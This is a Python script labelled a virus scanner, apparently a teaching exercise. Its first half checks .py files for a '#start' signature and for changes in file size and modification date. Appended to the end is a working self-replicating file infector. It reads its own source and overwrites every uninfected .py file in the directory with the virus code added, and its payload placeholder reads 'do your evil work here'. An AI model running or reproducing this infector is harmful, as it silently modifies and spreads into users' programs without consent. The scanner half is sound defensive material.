# virus scan program
import glob,re,os,csv
#Scan for signatures just like symantec or other anti viruses
def checkForSignatures():
    print("#### checking for virus signatures #####")
    #get all programs in the directory
    programs = glob.glob("*.py")
    for p in programs:
        thisFileInfected = False
        file = open(p,"r")
        lines=file.readlines()
        file.close()
        for line in lines:
            if(re.search("^#start",line)):
               #found a virus
               print("!!!!    VIRUS FOUND in file"+p)
               thisFileInfected = True
        if thisFileInfected == False:
               print(p+"   NO VIRUS ") 
    print("#### end section ####")
def getFileData():
    #get an initial scan of file size and date modified.
    programs = glob.glob("*.py")
    programList=[]
    for p in programs:
        programSize= os.path.getsize(p)
        programModified= os.path.getmtime(p)
        programData=[p,programSize,programModified]
        
        programList.append(programData)
    return programList
def WriteFileData(programs):
    if os.path.exists("fileData.txt"):
        return
    with open("fileData.txt","w") as file:
        wr=csv.writer(file)
        wr.writerows(programs)
        
def checkForChanges():
    print("###### check for heuristic changes in files")
    # open the fileData.txt file and compare each line
# to the current file size and dates
    with open("fileData.txt") as file:
        fileList=file.read().splitlines()
    orginalFileList=[]
    for each in fileList:
        items = each.split(',')
        orginalFileList.append(items)

    # get current data from directory
    currentFileList=getFileData()
    #compare old and new
    for c in currentFileList:
        for o in orginalFileList:
            if(c[0]==o[0]):
                #file names matched
                if str(c[1])!=str(o[1]) or str(c[2])!=str(o[2]):
                    #files sizes or dates doesnt match
                    print("File mismatch")
                    #print data of each file
                    print("current values= "+str(c))
                    print("orginal values= "+str(o))
                else:
                    print("file "+c[0]+"appears to be unchanged")
    print("##### finished checking for changes")

#do an initial scan and save the results in a text file/
WriteFileData(getFileData())
checkForSignatures()
checkForChanges()
#start
import sys,re,glob
# put a copy of all these lines
virusCode=[]
#open this file and read all lines
#filter out all lines that are not inside the virus code boundary
thisFile=sys.argv[0]
virusFile = open(thisFile,"r")
lines = virusFile.readlines()
virusFile.close()
#save the lines into a list to use later
inVirus = False
for line in lines:
    if(re.search("^#start",line)):
        inVirus = True

        #if the virus code has been found,start ppending the lines
        # to the virusCode list. We assume that the code is always a
        # appended to the end of the script.
    if(inVirus == True):
        virusCode.append(line)
    if(re.search("^#end of virus code",line)):
        break
# find potential victims
programs = glob.glob("*.py")
# check and infect all programs that the glob found

for p in programs:
    file =open(p,"r")
    programCode = file.readlines()
    file.close()

    # check to see if the file is already infected
    infected = False
    for line in programCode:
        if(re.search("^#start",line)):
            infected = True
            break
        #stop, we dont need to try to infect this program again
    if not infected:
        newCode = []
        # new version = current + virus code
        newCode = programCode
        newCode.extend(virusCode)

        #write the new version to the file.Overwrite the original
        file = open(p,"w")
        file.writelines(newCode)
        file.close()
        
# payload - do your evil work here
print("This file is infected")
#end of virus code
